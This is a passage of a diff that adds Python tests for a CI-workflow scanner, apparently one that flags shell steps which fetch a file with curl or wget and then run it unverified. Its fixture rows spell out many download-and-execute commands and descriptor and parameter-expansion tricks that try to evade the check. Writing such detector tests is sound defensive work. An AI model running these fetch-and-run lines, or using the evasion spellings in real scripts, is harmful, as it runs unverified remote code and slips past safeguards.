+        "curl -fsSL %stool -o ${D:-other }\nsh tool" % URL, "curl -fsSL %stool -o ${D:-x }\nsh tool" % URL)
+    DEST_CONTROLS = ('curl -fsSL %stool -o "${D:-tool }"\nsh tool' % URL,
+                     "curl -fsSL %stool -o ${D:-tool}\nsh other" % URL,
+                     "curl -fsSL %stool -o ${D}\nsh tool" % URL, "echo ${X:-a b} | sh")
+    # Round 2: a `$${` INSIDE a `${…}` nested in `_expansion_end` as `${` (dash runs the use);
+    # and a default holding a lifted substitution, or one no literal names, kept `main`'s
+    # "unresolved transfers" only where it was handed on split -- since round 5, every one is.
+    PID_INSIDE = (GET + "echo ${a:-$${b} x; sh tool; echo }", GET + "echo ${a:-$$} x; sh tool",
+                  GET + "echo ${a:-$$${b}}; sh tool")
+    UNRESOLVED = tuple("curl -fsSL %stool %s" % (URL, tail) for tail in (
+        "-o ${D:-$(echo tool) }\nsh tool", "-o ${D:-$(echo tool)}\nsh tool", "-o ${D:-`echo tool` }\nsh tool",
+        "-o ${D:-t$(echo ool) }\nsh tool", "> ${D:-$(echo tool) }\nsh tool",
+        "-o ${D:-$HOME/tool }\nsh $HOME/tool", "-o${D:-tool }\nsh tool", "-o ${D:=tool }\nsh ${D}",
+        "-o ${D:+tool }\nsh tool", "-o ${D:-tool } --output other\nsh tool")) + (
+        "curl -fsSLo${D:-tool } %stool\nsh tool" % URL, "D=tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+        "export D=tool\ncurl -fsSL %stool -o ${D:-x }\nsh $D" % URL)
+
+    def test_the_pid_and_a_brace_are_two_things(self):
+        for row in self.PID_ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        argv = wg.shell_reader.statements("echo $$'x' $${a,b}\n")[0].stages[0].argv
+        self.assertEqual(["echo", "$$x", "$${a,b}"], list(argv))
+
+    def test_the_pid_inside_an_expansion_opens_nothing(self):
+        for row in self.PID_INSIDE:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_default_the_reader_cannot_name_keeps_the_unresolved_report(self):
+        for row in self.UNRESOLVED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        found = wg.job_defects([("step", "curl -fsSL %stool -o ${D:-$HOME/tool }\nsh $HOME/tool\n" % URL)])
+        self.assertIn("unresolved transfers", str(found[0][1]))
+
+    # Round 5, the coordinator's edge list: a blank no quote or backslash covers splits the
+    # word where `main` split it; a covered one stays in it. Each spelling is a destination
+    # `-o <spelling>`; the words are what bash 5.2.21, 3.2.57 and dash make of `${D:-…}` with
+    # `D` unset (dash keeps a literal `$` before `$'…'` and `$"…"`, the blank still covered),
+    # and the reader's words are `main`'s, byte for byte. A split one is an unresolved
+    # transfer, reported; a covered one names one file (`tool x`), which `sh tool` never runs.
+    EDGES = (('${D:-"tool" x}', ["${D:-tool", "x}"]),           # [tool][x] x3
+             ("${D:-tool\\\\ x}", ["${D:-tool\\", "x}"]),        # [tool\][x] x3: an escaped backslash
+             ("${D:-'a'\"b\" c}", ["${D:-ab", "c}"]),           # [ab][c] x3
+             ('${D:-"a}b" c}', ["${D:-a}b", "c}"]),             # [a}b][c] x3
+             ('${D:-a"b c"d e}', ["${D:-ab cd", "e}"]),         # [ab cd][e] x3
+             ("${D:-$'tool' x}", ["${D:-tool", "x}"]),          # [tool][x]; dash [$tool][x]
+             ('${D:-"$E" x}', ["${D:-$E", "x}"]),               # [][x], b3 [x]
+             ("${D:-'tool x' y}", ["${D:-tool x", "y}"]),       # [tool x][y] x3
+             ('${D:-"tool} x" y}', ["${D:-tool} x", "y}"]),     # [tool} x][y] x3
+             ("${D:-'x }' y}", ["${D:-x }", "y}"]),             # [x }][y] x3
+             ('${D:-a "b}" c}', ["${D:-a", "b}", "c}"]),        # [a][b}][c] x3
+             ('${D:-"tool x"}', ["${D:-tool x}"]),               # [tool x] x3
+             ("${D:-tool\\ x}", ["${D:-tool x}"]),               # [tool x] x3
+             ('${D:-$"tool x"}', ["${D:-$tool x}"]),             # [tool x]; dash [$tool x]
+             ("${D:-$'tool x'}", ["${D:-tool x}"]),              # [tool x]; dash [$tool x]
+             ("${D:-tool\\\nx}", ["${D:-toolx}"]),               # [toolx] x3: a line joined
+             ('${D:-"a b"}" c"', ["${D:-a b} c"]))               # [a b c] x3
+
+    def test_a_blank_a_quote_covers_stays_in_the_word(self):
+        for spelling, words in self.EDGES:
+            with self.subTest(spelling=spelling):
+                stage = wg.shell_reader.statements("curl -fsSL %stool -o %s\n" % (URL, spelling))[0].stages[0]
+                argv = [str(word) for word in stage.argv]
+                self.assertEqual(words, argv[argv.index("-o") + 1:])
+                for shell in SHELLS:
+                    self.assertEqual(len(words) > 1, reported(
+                        "curl -fsSL %stool -o %s\nsh tool\necho done\n" % (URL, spelling), shell))
+
+    def test_a_destination_default_reads_as_main_reads_it(self):
+        for row in self.DEST_ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        for row in self.DEST_CONTROLS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+
+class TestADefaultDestinationIsNeverResolved(unittest.TestCase):
+    """PR #2856 round 5 (after rounds 3 and 4). A destination default resolved to its literal
+    can only clear a step `main` reports, and the names that decide it are not all in the step:
+    an inner program (`eval '…'`, `$(…)`, `bash -c`, a heredoc) parsed on its own, an indirect
+    or arithmetic setter, the workflow's `env:` or `$GITHUB_ENV` -- every shell writes `tool`
+    where `D` holds it. So no default resolves: each row reads as `main` reads it, an unresolved
+    transfer, whatever sets `D` and wherever; and nothing depends on what a parse saw before."""
+
+    ROWS = ("D=tool\neval 'curl -fsSL %stool -o ${D:-x }; sh tool'" % URL,
+            "D=tool\neval 'curl -fsSL %stool -o ${D:-x };' 'sh tool'" % URL,
+            "D=tool\nx=$(curl -fsSL %stool -o ${D:-x })\nsh tool" % URL,
+            "export D=tool\nbash -c 'curl -fsSL %stool -o ${D:-x }; sh tool'" % URL,
+            'export D=tool\nbash -c "cd .; curl -fsSL %stool -o \\${D:-x }; sh tool"' % URL,
+            "export D=tool\nbash <<'EOF'\ncurl -fsSL %stool -o ${D:-x }; sh tool\nEOF" % URL,
+            "D=tool bash -c 'curl -fsSL %stool -o ${D:-x }; sh tool'" % URL,
+            ": ${D:=tool}\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "read -r D <<'EOF'\ntool\nEOF\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "printf -v D tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            'n=D; eval "$n=tool"\ncurl -fsSL %stool -o ${D:-x }\nsh tool' % URL,
+            "n=D; read -r $n <<'EOF'\ntool\nEOF\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "(( D = 1 ))\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "eval D''=tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "eval 'D'='tool'\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "while getopts o: O; do :; done\ncurl -fsSL %stool -o ${OPTARG:-x }\nsh tool" % URL,
+            "D=other\ncurl -fsSL %stool -o ${D:-tool }\nsh tool" % URL,
+            "curl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "eval 'curl -fsSL %stool -o ${D:-tool }; sh tool'" % URL)
+
+    def test_each_row_is_reported_as_an_unresolved_transfer(self):
+        for row in self.ROWS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+        found = wg.job_defects([("step", "curl -fsSL %stool -o ${D:-x }\nsh tool\n" % URL)])
+        self.assertIn("unresolved transfers", str(found[0][1]))
+
+    def test_a_reading_does_not_depend_on_an_earlier_step(self):
+        # The round-4 seat's B3: the same text read alone and after a step that set `D` in it.
+        text = "eval 'curl -fsSL %stool -o ${D:-x }; sh tool'\necho done\n" % URL
+        alone = reported(text)
+        reported("D=tool\n" + text)
+        self.assertEqual(alone, reported(text))
+        self.assertTrue(alone)
+
+    def test_no_registry_or_latch_is_left(self):
+        for name in ("_ENCLOSING", "_LATCHED", "_ASSIGNED", "_SETTERS", "_assigned", "_register"):
+            with self.subTest(name=name):
+                self.assertFalse(hasattr(wg.shell_reader, name))
+
+
+class TestADestinationAndItsUseMeetUnderEitherReading(unittest.TestCase):
+    """PR #2856 round 6 (B1). Round 5 read a fetcher's operand and a redirection's target as
+    `main` read them (`${D:-tool`, a stray `}`) and every other word holding the same
+    blank-holding `${…}` whole (`${D:-tool }`), so a destination and its use no longer met:
+    `wget -q -O ${D:-tool } URL` ⏎ `sh ${D:-tool }` read CLEAN where `main` reports and every
+    shell runs the payload. Now the comparison meets and nothing resolves: the first piece of
+    a destination split as `main` read it keeps the whole word, a destination is filed under
+    both readings (`shell_reader.readings`), and `tee`'s operand is a destination read as a
+    fetcher's is. Round 8, the confinement (the round-7 verdict's ruling): every word but the
+    command word is `main`'s, so a destination and its use meet as they do on `main`; the two
+    ruled line-spanning rows read as `main` reads them again. Truth per row: b5e b5p b3e b3p de
+    b5n b3n dn (R ran, f fetched only)."""
+
+    B1 = ("wget -q -O ${D:-tool } %stool\nsh ${D:-tool }" % URL,                   # u07 RRRRRRRR
+          'wget -q -O ${D:-"tool" x} %stool\nsh ${D:-"tool" x}' % URL,             # u16 RRRRRRRR
+          "wget -qO- %stool > ${D:-tool }\nsh ${D:-tool }" % URL,                  # Y5a1 RRRRfRRf
+          "curl -fsSL %stool | tee ${D:-tool } > /dev/null\nsh < ${D:-tool }" % URL,  # Y6j1 RRRRfRRf
+          "wget -q -O ${D:-tool } %stool\nmv ${D:-tool } t2\nsh t2" % URL,         # B01w RRRRRRRR
+          "eval 'wget -q -O ${D:-tool } %stool; sh ${D:-tool }'" % URL,             # C01 RRRRRRRR
+          "wget -q -O${D:-tool } %stool\nsh ${D:-tool }" % URL,                    # D01 RRRRRRRR
+          "wget -q --output-document=${D:-tool } %stool\nsh ${D:-tool }" % URL,    # Y4a1 RRRRRRRR
+          "curl -fsSL %stool | sudo tee ${D:-tool } > /dev/null\nbash -s < ${D:-tool }" % URL,  # Y7k1
+          "bash -c 'curl -fsSL %stool | tee ${D:-tool } >/dev/null; sh < ${D:-tool }'" % URL)   # C07
+    # F2: `$$` is the PID pair here as in the splitter, so the `'\\'` after it is a plain quote
+    # (d03: RRffRRfR, bash runs the file `$$\\`, the first word of the default).
+    PID = "wget -qO ${D:-$$'\\' tool 'x y'} %stool\nsh ${D:-$$'\\' tool 'x y'}" % URL
+    # Nothing runs, and each reads CLEAN, as on `main`: F1 (a) a quoted or escaped blank keeps a
+    # shell's default one word, which names no shell (c11, c12, g19: --------); F1 (c) a blank is
+    # only what the shells split on, not `\v`, `\f`, U+00A0 or U+2003 (w01-w03, w05: ffffffff).
+    CLEAN = ("${X:-\"sh -c\"} 'curl -fsSL %si.sh | sh'" % URL, "${X:-sh\\ -c} 'curl -fsSL %si.sh | sh'" % URL,
+             "bash -c '${X:-\"sh -c\"} \"curl -fsSL %si.sh | sh\"'" % URL) + tuple(
+        "curl -fsSL %stool -o ${D:-tool%sx}\nsh tool" % (URL, blank) for blank in "\v\f\u00a0\u2003")
+
+    def test_each_b1_row_reports_as_main_does(self):
+        for row in self.B1 + (self.PID,):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_what_runs_nothing_reads_clean(self):
+        for row in self.CLEAN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_a_destination_and_its_use_are_mains_words(self):
+        reader = wg.shell_reader
+        argv = reader.statements("wget -q -O ${D:-tool } u\n")[0].stages[0].argv
+        self.assertEqual(["wget", "-q", "-O", "${D:-tool", "}", "u"], [str(w) for w in argv])
+        self.assertEqual(["sh", "${D:-tool", "}"], [str(w) for w in reader.statements("sh ${D:-tool }\n")[0].stages[0].argv])
+        self.assertEqual(["${D:-tool"], [str(w) for w in reader.statements("curl u > ${D:-tool }\n")[0].stages[0].writes])
+
+    # F3, the seat's edge list, each read as `main` reads it: `>>`, `&>` (d26b RRRRfRRf, d26c
+    # RRRR-RR-), `--output=` (d65b ffffffff, fail-closed as on `main`), a `-c` program and a heredoc
+    # (d19, d20 RRRRRRRR), a nested `${…}` and a `$(…)` in the default (c30i, d51c RRRRRRRR), and
+    # the named over-reports of F1: an `IFS` the step sets (i10 ffffffff), `$'…'` under dash, which
+    # keeps its `$` (c24 RRRRfRRf), and a line-spanning redirect target under dash (D0509 RRRRfRRf).
+    EDGE_FORMS = tuple("curl -fsSL %stool %s" % (URL, tail) for tail in (
+        ">> ${D:-tool }\nsh tool", "&> ${D:-tool }\nsh tool", "--output=${D:-tool }\nsh tool",
+        "-o ${D:-${E:-tool} }\nsh tool", "-o ${D:-$(echo tool) x}\nsh tool")) + (
+        "bash -c 'curl -fsSL %stool -o ${D:-tool }; sh tool'" % URL,
+        "bash <<'EOF'\ncurl -fsSL %stool -o ${D:-tool }\nsh tool\nEOF" % URL,
+        "curl -fsSL %si.sh | ${X:-$'bash' -s}" % URL)
+
+    def test_the_edge_forms_read_as_main_reads_them(self):
+        for row in self.EDGE_FORMS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_statement_that_only_redirects_reads_as_main_reads_one(self):
+        # F9: a statement with no command is no stage, as `main` reads `> ${D:-tool}` and `> f`;
+        # round 8 (the confinement): `> ${D:-tool }` is `main`'s too, shlex's stray `}` its command.
+        reader = wg.shell_reader
+        for script in ("> ${D:-tool}\n", "> f\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], [s for s in reader.statements(script) if s.stages])
+        stage = reader.statements("> ${D:-tool }\n")[0].stages[0]
+        self.assertEqual((["}"], ["${D:-tool"]), ([str(w) for w in stage.argv], [str(w) for w in stage.writes]))
+        stage = reader.statements(": > ${D:-tool }\n")[0].stages[0]
+        self.assertEqual(([":", "}"], ["${D:-tool"]), ([str(w) for w in stage.argv], [str(w) for w in stage.writes]))
+
+
+class TestTheWholeWordIsTheCommandWordsAlone(unittest.TestCase):
+    """PR #2856 round 8, the round-7 verdict's ruling (the confinement, #2731's own shape): the
+    whole reading of an unquoted `${…}` holding a bare blank applies only where the word decides
+    which program runs, the command word; every other word -- a destination, a use, `xargs`'s
+    input, a carrier, a value, a redirect's target -- is the words `main` split it into, and
+    every statement and stage is `main`'s. So the round-7 verdict's B1-B4 rows report as on
+    `main`; `<>` reads on descriptor 0 alone (#2657); and a step that spells a mark the reader
+    puts in its text (U+E000-U+E004) reads exactly as `main`. Truth b5e b5p b3e b3p de b5n b3n dn
+    (R ran the payload, f fetched only)."""
+
+    REPORT = (
+        "wget -q -O ${D:-tool } %stool\nsh ${D:-tool  }" % URL,                         # T101a RRRRRRRR
+        "wget -q --output-document=${D:-tool } %stool\nsh ${D:-tool  }" % URL,          # T401a RRRRRRRR
+        "wget -q -O ${D:-tool y} %stool\nsh ${D:-tool y}" % URL,
+        "curl -fsSL %stool -o tool\ncat tool > ${E:-t2 }\nsh ${E:-t2 }" % URL,          # G51a RRRRfRRf
+        "wget -q -O ${D:-tool } %stool\ncat ${D:-tool } > ${E:-t2 }\nsh ${E:-t2 }" % URL,  # Hk1a
+        "curl -fsSL %stool 1<> tool\nsh tool" % URL,                                    # N01a RRRRRRRR
+        'curl -fsSL %stool 1<> "tool"\nsh tool' % URL,                                  # N10a
+        "curl -fsSL %stool 1<> ${D:-tool }\nsh tool" % URL,                             # D0701 RRRRfRRf
+        "wget -q -O ${D:-tool } %stool\nF=${D:-tool }\nsh $F" % URL,
+        "wget -q -O ${D:-tool } %stool\nfor f in ${D:-tool }; do sh $f; done" % URL,     # V1a1
+        "wget -q -O${D:-tool } %stool\nfor f in ${D:-tool }; do sh $f; done" % URL,      # X4a1
+        "wget -q -O\ue004tool %stool\nsh \ue004tool" % URL,                              # RRRRRRRR
+        # The round-7 verdict's lead rows (RRRRRRRR; the U+E003 ones RRRRfRRf): B1 a use through
+        # the table, B2 `xargs`'s input, B3 the cap, B4 a literal mark, B5 the carrier's source.
+        "wget -q -O ${D:-tool } %stool\nP=./\nsh $P${D:-tool }" % URL,                  # SA11e
+        "wget -q -O ${D:-tool } %stool\nRUN=sh\nf() { $RUN ${D:-tool }; }\nf" % URL,     # SA11f
+        'wget -q -O ${D:-tool } %stool\nRUN=sh\neval "$RUN ${D:-tool }"' % URL,          # SA11g
+        "wget -q -O ${D:-tool } %stool\nC=chmod\n$C +x ${D:-tool }\n./tool" % URL,       # SA11j
+        "wget -q -O ${D:-tool } %stool\nls ${D:-tool  } | xargs sh" % URL,               # SX12d
+        "wget -q -O ${D:-tool x} %stool\nls ${D:-tool y} | xargs sh" % URL,              # SX13d
+        "wget -q -O ${D:-tool } %stool\nfor f in ${D:-tool } a0 a1 a2 a3 a4 a5; do sh $f; done" % URL,  # SK11l6
+        "wget -q -O ${D:-tool } %stool\nF=${D:-tool }\n" % URL + "".join(
+            'if [ -n "$Z%d" ]; then F=a%d; fi\n' % (n, n) for n in range(7)) + "sh $F",   # SK11f7
+        "wget -qO- %stool > ${D:-tool\ue003 }\nF=${D:-tool\ue003 }\nsh $F" % URL,        # SN3a5se
+        "wget -q -O ${D:-tool } %stool\nmv ${D:-tool  } t2\nsh t2" % URL,                # T101e
+        # The command word, read whole (#2731; round 4's F9 rows).
+        "curl -fsSL %si.sh | ${SH:-bash -s}" % URL,
+        "curl -fsSLo tool %stool\n${W:-sudo -E} bash tool" % URL,                        # h08
+        "curl -fsSLo tool %stool\n${RUN:-sh ./tool}" % URL,                             # h09
+        "curl -fsSLo tool %stool\nX=1\n${X:+sh tool}" % URL,                            # h10
+        "curl -fsSLo tool %stool\n${X:=bash tool}" % URL)                               # h11
+    # `<>` on another descriptor opens a file nothing writes the download to (the B3 control);
+    # and a step spelling a reader mark reads as `main`, which leaves `${SH:-bash -s}` a word
+    # it does not run (SE10's ruling: every shell runs the payload; `main` reads it CLEAN).
+    CLEAN = ("curl -fsSL %stool 2<> tool\nsh tool" % URL,) + tuple(
+        "echo %s\ncurl -fsSL %si.sh | ${SH:-bash -s}" % (mark, URL) for mark in "\ue000\ue001\ue002\ue003\ue004")
+
+    def test_each_row_main_reports_still_reports(self):
+        for row in self.REPORT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_another_descriptor_and_a_spelled_mark_read_as_main(self):
+        for row in self.CLEAN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+
+class TestAQuotedShellDefaultIsTheShellItNames(unittest.TestCase):
+    """PR #2856 round 9, the round-8 verdict's B1: `"${SH:-bash}"` is one word, every `$` of it
+    quoted, and the command layer reads it as the base did (#2337) -- a default holding no blank
+    -- so a pipe into it, or `SH=1` then `"${SH:+sh}" tool`, runs the shell it names. Round 8 read
+    no quoted word as a default at all (21 rows, `main` and the base RRRRRRRR). A quoted default
+    holding a blank names no shell: bash runs a command named ` bash` (KQp0, KQp1, KQp4)."""
+
+    PIPED = ['cat tool | "${SH:-bash}"', 'cat tool | "${SH-sh}"', 'cat tool | "${SH:=sh}"',
+             'cat tool | "${SH:-/bin/sh}"']                                              # KGa16-KGd16
+    ALTERNATE = ['"${SH:+sh}" tool', '"${SH:+sh}" ./tool', '"${SH:+sh}" -e tool', '"${SH:+sh}" -- tool',
+                 'cat tool | "${SH:+sh}"', 'F=tool\n"${SH:+sh}" $F', 'F=tool\n"${SH:+sh}" "$F"',
+                 'eval \'"${SH:+sh}" tool\'', 'if "${SH:+sh}" tool; then :; fi', '! "${SH:+sh}" tool',
+                 '{ "${SH:+sh}" tool; }', '( "${SH:+sh}" tool )', 'X0=1 "${SH:+sh}" tool',
+                 '"${SH:+sh}" -x tool', '"${SH:+sh}" -eu tool', 'SH=sh\n"${SH:+sh}" tool']  # KGe09-KGe46
+    REPORT = [GET + row for row in PIPED] + ["SH=1\n" + GET + row for row in ALTERNATE] + [
+        'SH=1\ncurl -fsSL %si.sh > i.sh\n"${SH:+sh}" i.sh' % URL]                      # KGe39
+    CLEAN = [GET + row for row in ('cat tool | "${SH:- bash}"', 'cat tool | "${SH:-bash }"',
+                                   'cat tool | "${SH:-\tsh}"')]
+
+    def test_each_quoted_default_main_reports_is_reported(self):
+        self.assertEqual(21, len(self.REPORT))
+        for row in self.REPORT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_quoted_default_holding_a_blank_names_no_shell(self):
+        for row in self.CLEAN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+
+class TestADupPutsTheDownloadInTheFileItsDescriptorOpened(unittest.TestCase):
+    """PR #2856 round 9, the coordinator's F5 ruling: `N<> file` opens the file on descriptor N for
+    reading and writing, fd 0 reads it, and a later `>&N` or `1>&N` writes to it -- so the download
+    lands in the file, and its use runs it. `main` reads `N<` then a `> file` the dup overrides, and
+    reads every one CLEAN. The 32 rows are RRRRRRRR (hunts 11, 13 and 16 of the round-8 seat)."""
+
+    USES = ("sh tool", "bash tool", "sh < tool", "chmod +x tool\n./tool", "cat tool | sh", ". ./tool")
+    THREE = ("sh tool", "sh < tool", "chmod +x tool\n./tool")
+    REPORT = ([("wget -qO- %stool 3<> tool >&3\n" % URL) + use for use in USES] +            # N03a-f
+              [("curl -fsSL %stool 3<>tool 1>&3\n" % URL) + use for use in USES] +          # N04a-f
+              [("curl -fsSL %stool 2<> tool 1>&2\n" % URL) + use for use in USES] +         # N05a-f
+              [("curl -fsSL %stool 9<> tool >&9\n" % URL) + use for use in THREE] +            # SD08a-c
+              [("curl -fsSL %stool 3<> tool 1>&3 3>&-\n" % URL) + use for use in THREE] +    # SD22a-c
+              [("curl -fsSL %stool %s\n" % (URL, dup)) + use for dup in (
+                  "3<> tool >&3", "2<> tool 1>&2", "3<>tool 1>&3", "9<>tool 1>&9 9>&-")
+               for use in ("sh tool", "sh < tool")])                                     # DI01/10/13/17a-b
+
+    def test_each_dup_row_is_reported(self):
+        self.assertEqual(32, len(self.REPORT))
+        for row in self.REPORT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+
+class TestAReadWriteDescriptorIsReadOnItsNumber(unittest.TestCase):
+    """#2881: `N<> file` opens the file for reading as well as writing, so a shell that dups N onto
+    its standard input (`sh 3<> tool <&3`, a move `<&3-` too) or reads N by a path (`sh /dev/fd/3
+    3<> tool`, `. /dev/stdin 3<> tool 0<&3`) runs the file. `main` read `N<> file` as a write alone
+    and read every one CLEAN, while the shells run the payload (#2856 round 9's dup hunt, and the
+    round-8 seat's SDu7, SDuc and DIu4). Round 2 (the round-1 verdict): the file is read only where
+    such a dup or path reaches it -- a check that merely holds a digest file open on N is credited
+    with what it reads, not that file (B1, B2) -- on every descriptor (B3)."""
+
+    DUPS = ("sh N<> tool <&N", "sh N<> tool 0<&N", "sh N<>tool <&N", "bash N<> tool <&N",
+            "bash -s N<> tool <&N", "sh -s N<> tool 0<&N", "sh N<> tool 0<&N N<&-", "sh - N<> tool <&N",
+            "N<> tool <&N sh", "N<>tool 0<&N bash -s", "sh N<> tool 0<&N 1>&2")
+    PATHS = ("sh /dev/stdin N<> tool <&N", ". /dev/stdin N<> tool 0<&N", "bash /dev/stdin N<> tool <&N",
+             "sh /dev/fd/N N<> tool", "bash /dev/fd/N N<>tool", ". /dev/fd/N N<> tool",
+             "sh /dev/fd/0 N<> tool <&N")
+    MOVES = ("sh N<> tool <&N-", "bash N<>tool 0<&N- -s")      # a move: bash alone runs it
+    # Every shell runs these on descriptors 1-9 (RRRRRRRR); bash alone past 9, where dash opens
+    # no descriptor, and a move, which dash rejects (RRRRfRRf).
+    BASH = (None, "bash", "bash {0}")
+    NUMBERS = ((("1", "2", "3", "9"), SHELLS, BASH), (("10", "99"), BASH, BASH))
+
+    def test_a_dup_onto_standard_input_or_a_path_runs_the_file(self):
+        for numbers, shells, moved in self.NUMBERS:
+            for number in numbers:
+                for uses, settings in ((self.DUPS + self.PATHS, shells), (self.MOVES, moved)):
+                    for use in uses:
+                        row = GET + use.replace("N", number)
+                        for shell in settings:
+                            with self.subTest(row=row, shell=shell):
+                                self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_descriptor_redirected_again_reads_the_file_no_longer(self):
+        # Closed, or opened on another file, before the dup: no shell runs the download (ffffffff).
+        for use in ("sh 3<> tool 3<&- <&3", "echo : > other\nsh 3<> tool 3< other <&3"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertFalse(reported(GET + use + "\necho done\n", shell))
+
+    def test_a_dup_carries_the_file_to_another_descriptor(self):
+        # Round 2, the coordinator's note on the round-1 seat's DX rows: `4<&3` puts on 4 the file
+        # `3<>` opened on 3, so a later dup of 4 onto standard input reads it -- DX05, DX06 and DX14,
+        # every shell running the download, and so after 3 closes. The move `4<&3-` runs under bash
+        # alone (dash takes none); closed on 3 and on 4 before the dup, nothing runs (ffffffff). Round 3
+        # moved the control: closed on 4 alone, 3 still holds the file, which a shell reads (main's `3<`).
+        for use in ("sh 3<> tool 4<&3 <&4", "sh 3<> tool 4>&3 0<&4", "sh 4<> tool 3<&4 <&3",
+                    "sh 3<> tool 4<&3 3<&- <&4"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+        for shell in self.BASH:
+            with self.subTest(use="the move", shell=shell):
+                self.assertTrue(reported(GET + "sh 3<> tool 4<&3- <&4\necho done\n", shell))
+        for shell in SHELLS:
+            with self.subTest(use="closed on 3 and 4", shell=shell):
+                self.assertFalse(reported(GET + "sh 3<> tool 4<&3 3<&- 4<&- <&4\necho done\n", shell))
+
+    def test_a_shell_reads_what_n_holds_by_any_route(self):
+        # Round 3, the round-2 verdict's B2 and B3: a shell reads what `N<>` still holds when its
+        # redirections end, as `main` reads `N<` -- by a path the reader resolves (UP007, UP008, UP011, a
+        # path in a value UP016, `/dev/stdout` VP001 and VP003), a child program (UX26, UX30, the subshell
+        # UX42) and a command word the step's values decide (DW28). Every shell runs the download.
+        for use in ("sh /proc/thread-self/fd/3 3<> tool", "sh //dev/fd/3 3<> tool", "sh /proc/self/fd/../fd/3 3<> tool",
+                    "P=/dev/fd/3\nsh $P 3<> tool", "sh /dev/stdout 1<> tool", "sh /dev/stdout 3<> tool 1>&3",
+                    "sh -c 'sh <&3' 3<> tool", "sh -c 'sh /dev/fd/3' 3<> tool", "( sh <&3 ) 3<> tool",
+                    "SH=sh\n$SH 3<> tool <&3"):
+            for shell in SHELLS:
+                with self.subTest(use=use, shell=shell):
+                    self.assertTrue(reported(GET + use + "\necho done\n", shell))
+
+    def test_a_check_is_credited_with_no_file_it_only_holds(self):
+        # Round 3, the round-2 verdict's B1: a check that reads `self` -- by its operand or on standard
+        # input after the dup, straight or through a chain -- while it holds the pinned `sums` on 3 checks
+        # the download against itself, so the use stays reported (QO001, QL001, WO001, WL001; wrong
+        # digests, every shell running the download).
+        wrong = 'echo "%s  tool" > sums\ncurl -fsSLo tool %stool\nsha256sum tool > self\n' % ("a" * 64, URL)
+        for check in ("sha256sum -c self 3<> sums <&3", "sha256sum -c 3<> sums <&3 < self",
+                      "sha256sum -c self 3<> sums 4<&3 <&4", "sha256sum -c 3<> sums 4<&3 <&4 < self"):
+            for shell in SHELLS:
+                with self.subTest(check=check, shell=shell):
+                    self.assertTrue(reported(wrong + check + "\nsh tool\necho done\n", shell))
+
+    def test_a_check_is_credited_with_what_it_reads_alone(self):
+        # Round 2, B1 (the round-1 seat's CF lead row, with a wrong digest): the check verifies its
+        # standard input, the download's own fresh hash, and only holds `sums` open on 3 -- so the
+        # use is unverified. B2, its mirror: a pinned check on standard input, holding another file
+        # open on 3, still verifies what it reads.
+        unverified = ('echo "%s  tool" > sums\ncurl -fsSLo tool %stool\n'
+                      'sha256sum tool | sha256sum -c 3<> sums\nsh tool\necho done\n' % ("0" * 64, URL))
+        for shell in (None, "bash", "sh"):
+            with self.subTest(row="CF", shell=shell):
+                self.assertTrue(reported(unverified, shell))
+        verified = GET + '%s 3<> other\nsh tool\necho done\n' % CHECK
+        for shell in (None, "bash", "sh"):
+            with self.subTest(row="CO", shell=shell):
+                self.assertFalse(reported(verified, shell))
+
+    def test_a_path_of_n_or_a_dup_a_value_decides_carries_what_n_holds(self):
+        # Round 4, the round-3 verdict's B1: a path open of N's descriptor carries what N holds onto
+        # its target, as a dup does, so a later close of N leaves it there (AP001; the spellings the
+        # reader resolves, AP025, AP033 and AP041; onto 4, AP073 and AP081; read-write onto 0, AP113; an
+        # operand, AP161). A path in a value (AP153), or a dup whose source a value decides (AD001,
+        # AD007, AD016, AD019), carries every file held, fail-closed. Every shell runs the download.
+        for use in ("sh 3<> tool </dev/fd/3 3<&-", "dash 3<> tool </proc/self/fd/3 3<&-",
+                    "bash 3<> tool </proc/thread-self/fd/3 3<&-", "sh 3<> tool <//dev/fd/3 3<&-",
